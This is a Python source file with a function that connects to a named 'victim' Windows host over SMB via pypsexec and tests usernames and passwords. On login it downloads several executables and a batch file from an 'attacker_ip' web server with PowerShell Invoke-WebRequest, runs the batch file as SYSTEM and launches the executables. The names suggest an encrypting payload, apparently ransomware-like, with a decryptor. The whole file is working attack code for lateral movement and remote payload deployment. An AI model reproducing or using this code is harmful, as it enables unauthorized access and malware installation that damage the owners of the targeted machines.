from pypsexec.client import Client
import time

def psexe(victim_ip,username,password,attacker_ip):
    status=False
    c = Client(victim_ip, username=username, password=password)
    try:
        c.connect()
        print("[*] Success Target: {0}, Testing with username: {1}, testing with password: {2}".format(victim_ip,username,password))
        status=True
    except:
        print("[*] Failed Target: {0}, Testing with username: {1}, testing with password: {2}".format(victim_ip,username,password))
        return status
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/kamehameha_windows.exe -o C:\\Users\\"+username+"\\Desktop\\kamehameha_windows.exe")
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/decrypt_kamehameha.exe -o C:\\Users\\"+username+"\\Desktop\\decrypt_kamehameha.exe")
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/GOKU.jpg -o C:\\Users\\"+username+"\\Desktop\\GOKU.jpg")
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/wall.bat -o C:\\Users\\"+username+"\\Desktop\\wall.bat")
        stdout, stderr, rc = c.run_executable("C:\\Users\\Administrator\\Desktop\\wall.bat", use_system_account=True)
        stdout, stderr, rc = c.run_executable("C:\\Users\\Administrator\\Desktop\\kamehameha_windows.exe",working_dir="C:\\Users\\Administrator\\Desktop\\",asynchronous=True)
        time.sleep(3)
        stdout, stderr, rc = c.run_executable("C:\\Users\\Administrator\\Desktop\\decrypt_kamehameha.exe",working_dir="C:\\Users\\Administrator\\Desktop\\",asynchronous=True)
        time.sleep(1.5)
    except Exception as e:
        print(e)
    finally:
        c.remove_service()
        c.disconnect()
        return status 
